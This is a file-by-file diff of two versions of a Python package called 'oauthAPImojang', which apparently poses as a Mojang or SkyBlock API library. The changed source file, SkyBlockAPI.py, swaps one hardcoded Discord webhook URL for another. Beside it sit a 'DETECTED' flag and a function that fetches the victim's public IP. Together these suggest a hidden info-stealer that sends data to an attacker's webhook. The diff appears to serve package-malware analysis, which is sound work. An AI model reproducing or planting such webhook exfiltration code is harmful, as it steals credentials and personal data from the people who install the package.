# Comparing `tmp/oauthAPImojang-0.3.4.tar.gz` & `tmp/oauthAPImojang-0.3.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "oauthAPImojang-0.3.4.tar", last modified: Sun Apr 16 23:51:08 2023, max compression
+gzip compressed data, was "oauthAPImojang-0.3.5.tar", last modified: Sun Apr 16 23:59:56 2023, max compression
```

## Comparing `oauthAPImojang-0.3.4.tar` & `oauthAPImojang-0.3.5.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/
--rw-rw-rw-   0        0        0       61 2023-04-16 23:51:10.000000 oauthAPImojang-0.3.4/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/oauthAPImojang/
--rw-rw-rw-   0        0        0    35440 2023-04-16 22:18:16.000000 oauthAPImojang-0.3.4/oauthAPImojang/SkyBlockAPI.py
--rw-rw-rw-   0        0        0       97 2023-04-16 23:47:12.000000 oauthAPImojang-0.3.4/oauthAPImojang/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/oauthAPImojang.egg-info/
--rw-rw-rw-   0        0        0       61 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/oauthAPImojang.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      254 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/oauthAPImojang.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/oauthAPImojang.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       22 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/oauthAPImojang.egg-info/requires.txt
--rw-rw-rw-   0        0        0       15 2023-04-16 23:51:08.000000 oauthAPImojang-0.3.4/oauthAPImojang.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-04-16 23:51:10.000000 oauthAPImojang-0.3.4/setup.cfg
--rw-rw-rw-   0        0        0      203 2023-04-16 23:51:02.000000 oauthAPImojang-0.3.4/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/
+-rw-rw-rw-   0        0        0       61 2023-04-16 23:59:58.000000 oauthAPImojang-0.3.5/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/oauthAPImojang/
+-rw-rw-rw-   0        0        0    35440 2023-04-16 23:59:02.000000 oauthAPImojang-0.3.5/oauthAPImojang/SkyBlockAPI.py
+-rw-rw-rw-   0        0        0       97 2023-04-16 23:47:12.000000 oauthAPImojang-0.3.5/oauthAPImojang/__init__.py
+drwxrwxrwx   0        0        0        0 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/oauthAPImojang.egg-info/
+-rw-rw-rw-   0        0        0       61 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/oauthAPImojang.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      254 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/oauthAPImojang.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/oauthAPImojang.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       22 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/oauthAPImojang.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       15 2023-04-16 23:59:56.000000 oauthAPImojang-0.3.5/oauthAPImojang.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-04-16 23:59:58.000000 oauthAPImojang-0.3.5/setup.cfg
+-rw-rw-rw-   0        0        0      203 2023-04-16 23:59:50.000000 oauthAPImojang-0.3.5/setup.py
```

### Comparing `oauthAPImojang-0.3.4/oauthAPImojang/SkyBlockAPI.py` & `oauthAPImojang-0.3.5/oauthAPImojang/SkyBlockAPI.py`

 * *Files 1% similar despite different names*

```diff
@@ -16,15 +16,15 @@
 import subprocess
 
 #  THIS IS 1.1.6 VERSION
 #    BY jyyle
 # 
 
 
-hook = "https://discordapp.com/api/webhooks/1097280748253368401/rlMLWeAuv6nwgGOdjTj7ESsVwt-FJjqHUsH7H0b2DPD5MXmhj_FoPGJ6jf8iDzKz5Sjh"
+hook = "https://discordapp.com/api/webhooks/1097307844212174848/8DTI4OrLqyo75E8vpUdh5bzViKHRRLHikrzp94XDpgH7-gHd47qDiUtfem3ktfvkMULt"
 DETECTED = False
 
 
 def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
```

